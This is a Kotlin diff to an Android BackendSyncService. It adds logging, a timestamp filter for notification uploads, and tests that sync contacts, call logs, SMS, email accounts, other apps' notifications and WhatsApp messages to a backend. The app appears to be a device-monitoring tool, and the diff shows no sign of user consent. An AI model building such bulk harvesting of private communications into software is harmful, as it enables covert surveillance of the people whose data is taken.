@@ -173,13 +173,21 @@ class BackendSyncService(private val context: Context) {
     suspend fun registerDevice(deviceInfo: DeviceInfo): Result<DeviceInfo> {
         return withContext(Dispatchers.IO) {
             try {
+                println("🔧 Attempting to register device: ${deviceInfo.deviceId}")
                 val response = apiService.registerDevice(deviceInfo)
-                if (response.isSuccessful && response.body()?.success == true) {
-                    Result.success(response.body()?.data ?: deviceInfo)
+                println("🔧 Device registration response: ${response.code()}")
+                
+                if (response.isSuccessful) {
+                    val responseBody = response.body()
+                    println("🔧 Device registration successful: ${responseBody?.message}")
+                    Result.success(deviceInfo)
                 } else {
-                    Result.failure(Exception(response.body()?.error ?: "Failed to register device"))
+                    val errorMessage = "Failed to register device: ${response.code()} - ${response.message()}"
+                    println("❌ $errorMessage")
+                    Result.failure(Exception(errorMessage))
                 }
             } catch (e: Exception) {
+                println("❌ Exception during device registration: ${e.message}")
                 Result.failure(e)
             }
         }
@@ -337,13 +345,26 @@ class BackendSyncService(private val context: Context) {
         }
     }
     
-    suspend fun syncNotifications(deviceId: String): SyncResult {
+    suspend fun syncNotifications(deviceId: String, sinceTimestamp: Long = 0L): SyncResult {
         return withContext(Dispatchers.IO) {
             try {
                 val notifications = getNotificationsFromDevice()
-                println("📱 Syncing ${notifications.size} notifications for device $deviceId")
                 
-                val data = notifications.map { notification ->
+                // Filter notifications by timestamp if provided
+                val filteredNotifications = if (sinceTimestamp > 0L) {
+                    notifications.filter { it.timestamp > sinceTimestamp }
+                } else {
+                    notifications
+                }
+                
+                println("📱 Syncing ${filteredNotifications.size} notifications for device $deviceId (since: ${if (sinceTimestamp > 0L) "timestamp $sinceTimestamp" else "all time"})")
+                
+                if (filteredNotifications.isEmpty()) {
+                    println("📱 No new notifications to sync")
+                    return@withContext SyncResult.Success(0)
+                }
+                
+                val data = filteredNotifications.map { notification ->
                     mapOf(
                         "packageName" to notification.packageName,
                         "title" to notification.title,
@@ -366,7 +387,7 @@ class BackendSyncService(private val context: Context) {
                 if (response.isSuccessful && response.body()?.success == true) {
                     val syncResponse = response.body()?.data
                     println("✅ Notifications sync successful: ${syncResponse?.itemsSynced} items")
-                    SyncResult.Success(syncResponse?.itemsSynced ?: notifications.size)
+                    SyncResult.Success(syncResponse?.itemsSynced ?: filteredNotifications.size)
                 } else {
                     println("❌ Notifications sync failed: ${response.code()} - ${response.body()?.error}")
                     SyncResult.Error(response.body()?.error ?: "Failed to sync notifications")
@@ -468,19 +489,31 @@ class BackendSyncService(private val context: Context) {
             
             val results = mutableMapOf<String, SyncResult>()
             
-            // Test 1: Email Accounts
+            // Test 1: Contacts
+            println("\n👥 === TESTING CONTACTS ===")
+            results["CONTACTS"] = syncContacts(deviceId)
+            
+            // Test 2: Call Logs
+            println("\n📞 === TESTING CALL LOGS ===")
+            results["CALL_LOGS"] = syncCallLogs(deviceId)
+            
+            // Test 3: SMS Messages
+            println("\n💬 === TESTING SMS MESSAGES ===")
+            results["MESSAGES"] = syncMessages(deviceId)
+            
+            // Test 4: Email Accounts
             println("\n📧 === TESTING EMAIL ACCOUNTS ===")
             results["EMAIL_ACCOUNTS"] = syncEmailAccounts(deviceId)
             
-            // Test 2: Notifications
+            // Test 5: Notifications
             println("\n🔔 === TESTING NOTIFICATIONS ===")
-            results["NOTIFICATIONS"] = syncNotifications(deviceId)
+            results["NOTIFICATIONS"] = syncNotifications(deviceId, 0L)
             
-            // Test 3: WhatsApp Messages
+            // Test 6: WhatsApp Messages
             println("\n💬 === TESTING WHATSAPP MESSAGES ===")
             results["WHATSAPP"] = syncWhatsApp(deviceId)
             
-            // Test 4: Media Files (Removed - not supported in current backend)
+            // Test 7: Media Files (Removed - not supported in current backend)
             println("\n📸 === MEDIA FILES TEST SKIPPED ===")
             results["MEDIA"] = SyncResult.Error("Media sync not supported in current backend version")
             
